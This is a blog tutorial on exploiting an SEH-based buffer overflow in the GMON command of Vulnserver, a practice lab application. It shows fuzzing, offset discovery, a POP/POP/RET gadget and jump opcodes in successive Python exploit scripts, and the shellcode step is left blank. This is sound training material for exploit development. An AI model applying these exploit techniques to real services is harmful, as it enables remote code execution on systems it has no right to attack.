This is the fourth article on the series of exploiting `Vulnserver`, a
`VbD` (Vulnerable-by-Design) application in which you can practice
Windows exploit development.

In our previous posts, we have successfully exploited
[TRUN](../vulnserver-trun/), and
[GTER](../vulnserver-gter-no-egghunter/) commands. Both of them had
something in common: direct `EIP` overwrite, in which our buffer
directly overwrote the `saved return address` on the stack frame of the
affected function with a `JMP` instruction to execute the code on our
controlled buffer.

In this post, we will exploit the `GMON` command using a Structured
Exception Handling (`SEH`) overwrite to take control of the flow of
Vulnserver.

## Structured Exception Handling

`SEH` is a non-standard mechanism created by Microsoft to handle
exceptions of applications using a uniform structure. It allows `C/C++`
programs using the well-known exception handling syntax
(`try-except-finally`) used by other high-level imperative languages.
Here’s an example:

``` c
__try {
    ....
    strcpy(mybuff, myinput);
}
__except (INSUFFICIENT_MEMORY) {
    my_exception_handler();
}
```

As you may imply, this code will try to execute `strcpy()`, and if it
fails because `INSUFFICIENT_MEMORY`, it will execute
`my_exception_handler()`.

As there may be many exceptions, some explicitly declared by the
application and other by the `OS`, the handlers are tied together by a
chain of `_EXCEPTION_REGISTRATION_RECORD` structures, the last one
(identified by `FFFFFFFF`) being the default handler.

When an exception occurs, the `OS` will walk the `SEH` chain, finding
which of them can handle that exception. If none of the handlers have
that exception registered, the default handler (`FFFFFFFF`) will be
triggered.

The structure of `_EXCEPTION_REGISTRATION_RECORD` is:

``` c
typedef struct _EXCEPTION_REGISTRATION_RECORD
{
     PEXCEPTION_REGISTRATION_RECORD Next;
     PEXCEPTION_DISPOSITION Handler;
} EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD;
```

Here the `Next` parameter is a pointer to the next exception handler,
also called `nSEH`, and the `Handler` parameter is a pointer to the
handler itself. We can see the exception handler’s chain on a debugger:

<div class="imgblock">

![SEH chain](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331141/blog/vulnserver-gmon/seh1_cwzur2.webp)

</div>

And on the stack, it is shown as:

<div class="imgblock">

![SEH chain](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331143/blog/vulnserver-gmon/seh2_vg1vlp.webp)

</div>

More information on `SEH` can be found on [Microsoft’s
site](https://docs.microsoft.com/en-us/cpp/cpp/structured-exception-handling-c-cpp?view=vs-2019).

## SEH exploiting

To oversimplify, the main goal of exploiting a program using `SEH` is to
have the ability to overwrite the exception handler pointer
(`my_exception_handler()` in our example) of the vulnerable function
with a pointer to our controlled code.

Some things must be in place for us to successfully exploit an
application using `SEH`:

1. The application must have `SEH` built-in. This is a compile-time
    option.

2. Our buffer will be allowed to pass far enough in the stack frame to
    reach the function’s `SEH` handler.

3. The application must be compiled with `SafeSEH=Off`.

`SafeSEH` is a mechanism created since Windows XP that statically
defines the list of the allowed exception handlers, and if the
application tries to call something different, a crash will happen.

Ok, now with that summary of `SEH`, let’s get our hands dirty.

## Fuzzing GMON

As with the other Vulnserver commands, the `GMON` command takes a single
parameter, so, we can reuse our Spike fuzz template:

``` c
s_string("GMON ");
s_string_variable("*");
```

Remember that the `s_string` command will send an immutable string to
the fuzzed protocol, and `s_string_variable` tells `Spike` to use that
string as a fuzz point.

And run it:

<div class="imgblock">

![Fuzzing GMON](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331143/blog/vulnserver-gmon/fuzz1_qh0ra7.gif)

</div>

We got the crash\!

And as with the other Vulnserver commands, it seems that 5060 bytes of
data triggered the crash:

<div class="imgblock">

![Wireshark](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331142/blog/vulnserver-gmon/wireshark1_qyfgfo.webp)

</div>

We can create our first proof-of-concept exploit:

**exploit.py.**

``` python
import socket

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'GMON /.:/' +
    b'A' * 5000
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

Now run our exploit with `vulnserver.exe` attached to a debugger:

<div class="imgblock">

![PoC](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331143/blog/vulnserver-gmon/crash1_hrw5ri.gif)

</div>

As you can see, we effectively crashed `vulnserver.exe`, but `EIP` does
not seem to be mangled by our buffer.

However, if we look at the `SEH` chain table, we will see this:

<div class="imgblock">

![Corrupted SEH](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331141/blog/vulnserver-gmon/seh3_axexgv.webp)

</div>

That means that we effectively triggered an exception and overwrote the
exception handler with our buffer. If we trigger the exception handler
(in Immunity Debugger, it’s done with `Shift+F9`) this will happen:

<div class="imgblock">

![EIP control](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331142/blog/vulnserver-gmon/eip1_keniyt.gif)

</div>

We control `EIP!` That means that we have control over the process
execution flow again.

We can now exploit this.

## Exploiting

We first need to find the exact offset on where the `SEH` handler gets
overwritten. We can do that by creating a cyclic pattern using
`pattern_create.rb` from Metasploit:

``` console
$ msf-pattern_create -l 5000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac....
```

Let’s add that pattern to our exploit:

``` python
import socket

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'GMON /.:/' +
    b'<insert pattern here>'
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

And run it:

<div class="imgblock">

![Pattern offset](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331142/blog/vulnserver-gmon/pattern1_pds6g9.webp)

</div>

As you can see, the handler was overwritten with `346F4533`. To find the
offset in which the `SEH` handler gets overwritten, we can use
`pattern_offset.rb`:

``` console
$ msf-pattern_offset -q 346F4533
[*] Exact match at offset 3551
```

Great, the offset on which the `SEH` handler starts to be overwritten is
`3551`.

To check that offset, we can inject:

1. 3551 `A` characters

2. 4 `B` characters

3. 5000 - 3551 - 4 = 1445 `C` characters

If the `SEH` handler gets overwritten with our `B` buffer, we got it
right. This is our updated exploit:

``` python
import socket

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'GMON /.:/' +
    b'A' * 3551 +
    b'B' * 4 +
    b'C' * 1445
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

And the result:

<div class="imgblock">

![Right offset](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331142/blog/vulnserver-gmon/offset1_sosm3e.gif)

</div>

Awesome\!

Now, what would normally happen is to find a `JMP ESP` instruction.

However, let’s look at the state of the stack after triggering the
exception handler:

<div class="imgblock">

![Stack](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331143/blog/vulnserver-gmon/aftercrash1_ipm82n.webp)

</div>

We can see several things here:

1. `EIP` is `42424242`.

2. There are 8 bytes between the `ESP` at `0104EBA0` and a pointer to
    our buffer at `0104EBA8`.

3. So, if we’d run a `JMP ESP`, we’d land at a place in the stack which
    we don’t control, and exploitation would likely fail.

So we need to find a way of removing those 8 bytes off of the stack in
order to redirect the execution flow to `0104EBA8` which has a pointer
to our controlled buffer.

## POP/POP/RET

The x86 stack is a `LIFO` (Last In First Out) structure where the last
item pushed into the stack is the first to be popped back. Each `PUSH`
instruction will push exactly 4 bytes into the stack, decreasing the
stack pointer (`ESP = ESP - 4`) and every `POP` instruction will pop
exactly 4 bytes off of the stack, increasing the stack pointer (`ESP =
ESP + 4`).

<div>
<cta-banner
buttontxt="Read more"
link="/solutions/ethical-hacking/"
title="Get started with Fluid Attacks' Ethical Hacking solution right now"
/>
</div>

With that in mind, and knowing that we need to remove 8 bytes of the
stack to then return to `0104EBA8` which has a pointer to our controlled
buffer, we need to find an address that contains a sequence of these
instructions:

``` x86asm
POP R32           ; R32 can be any 32 bits register
POP R32
RET
```

The first `POP` will remove the first 4 bytes of the stack, the next
`POP` the other 4 bytes. The `RET` will place the pointer at `0104EBA8`
to `EIP` which will redirect the execution flow to our buffer.

We can find those 3 instructions using many ways. I will use `mona.py`:

``` console
!mona seh -cp nonull -cm safeseh=off -o
```

This will tell `mona.py` to find `POP/POP/RET` instruction sequences and
omit addresses with null characters (`-cp nonull`), omit addresses on
modules compiled with `SafeSEH` (`-cm safeseh=off`), and omit addresses
on modules of the `OS` (`-o`).

<div class="imgblock">

![POP POP RET](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331142/blog/vulnserver-gmon/mona1_gzwngq.webp)

</div>

And we got 12 different options. We can choose any of those. I will
choose the sequence at `625011FB` just because :)

We can now update our exploit with that address:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'GMON /.:/' +
    b'A' * 3551 +
    # 625011FB    58                          POP EAX
    # 625011FC    5A                          POP EDX
    # 625011FD    C3                          RETN
    struct.pack('<L', 0x625011FB) +
    b'C' * 1445
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

And run it:

<div class="imgblock">

![POP POP RET](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331143/blog/vulnserver-gmon/popret1_xnh1tf.gif)

</div>

Weeeeeeeh\! We overwrote the `SEH` handler, triggered the exception, and
redirected to a `POP/POP/RET` sequence that returned to our controlled
buffer\!

However…​\!

We landed only 4 bytes before our injected `POP/POP/RET` address.
Remember the `_EXCEPTION_REGISTRATION_RECORD` structure? It has 2
members: the `SEH` handler, which we are overwriting with the
`POP/POP/RET` address, and the pointer to the next exception handler,
also called `nSEH`. Well, we landed at `nSEH`.

However, just after the injected address there’s a good 43 bytes buffer,
and before `nSEH` we had our 3500+ bytes buffer of `A`.

So, what’s next? That’s right\! We must jump around again\!

## Jump around

We only have 4 bytes to perform our first jump. Fortunately for us,
short jumps are only [2 bytes
long](https://thestarman.pcministry.com/asm/2bytejumps.htm).

We must perform a short jump of at least 8 bytes to pass **over** our
injected `POP/POP/RET` address and land on our `C` buffer. We can get
the needed opcodes using `nasm_shell.rb`:

``` console
$ msf-nasm_shell
nasm > jmp short +0xa
00000000  EB08              jmp short 0xa
```

**Fun fact:** Note that we told to perform a 10 byte (`0xa`) jump, and
the returned opcode was `EB08`. It’s because the `JMP` will calculate
the offset including the length of the `JMP` instruction, which is 2
bytes.

OK, with our short jump opcode we can update our exploit:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'GMON /.:/' +
    b'A' * (3551 - 4) +
    # JMP SHORT +0xa
    b'\xeb\x08' +
    # NOP NOP to fill the 4 bytes of nSEH
    b'\x90\x90' +
    # 625011FB    58                          POP EAX
    # 625011FC    5A                          POP EDX
    # 625011FD    C3                          RETN
    struct.pack('<L', 0x625011FB) +
    b'C' * 1445
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

And see if we could effectively jump over the `SEH` handler:

<div class="imgblock">

![Short jump](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331142/blog/vulnserver-gmon/jmp1_hsds6d.gif)

</div>

Yes\! We are past our `SEH` handler. Now we have enough room of bytes to
perform a long jump back to the start of our `A` buffer. With the
debugger’s help, we get the needed offset by simply telling it to jump
to the start of our `A` buffer and letting it calculate the offset.

<div class="imgblock">

![Long jump](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331141/blog/vulnserver-gmon/jmp2_xmjgq1.gif)

</div>

As you can see, the resultant bytes are `E9 16 F2 FF FF`.

Let’s update our exploit with that:

``` python
import socket
import struct

HOST = '192.168.0.20'
PORT = 9999

PAYLOAD = (
    b'GMON /.:/' +
    b'A' * (3551 - 4) +
    # JMP SHORT +0xa
    b'\xeb\x08' +
    # NOP NOP to fill the 4 bytes of nSEH
    b'\x90\x90' +
    # 625011FB    58                          POP EAX
    # 625011FC    5A                          POP EDX
    # 625011FD    C3                          RETN
    struct.pack('<L', 0x625011FB) +
    b'C' * 2 +
    # JMP long backwards to the start of our 'A' buffer
    b'\xe9\x16\xf2\xff\xff' +
    b'C' * (1445 - 2 - 5)
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
```

And check it:

<div class="imgblock">

![Long jump](https://res.cloudinary.com/fluid-attacks/image/upload/v1620331140/blog/vulnserver-gmon/jmp3_pwvvyj.gif)

</div>

Great\! All that’s left is to insert a shellcode. Let’s do that.

## Getting shell

We can create a reverse shellcode using `msfvenom` from Metasploit:

``` console

And with that, we can have the final exploit:

``` python

Our shell\! We are getting good at it, aren’t we?

You can download the final exploit [here](exploit.py)

## Conclusion

Exploiting applications using `SEH` overwriting is just a little
different than the vanilla `EIP` overwrite. However, you must take care
of the little details all the way down to get a successful exploitation.
You can check different `SEH`-based exploits at the [Vulnserver
LTER](../vulnserver-lter-seh/), the [QuickZIP
exploiting](../quickzip-exploit/) and the [Netscanner
exploiting](../netscan-exploit/) articles.
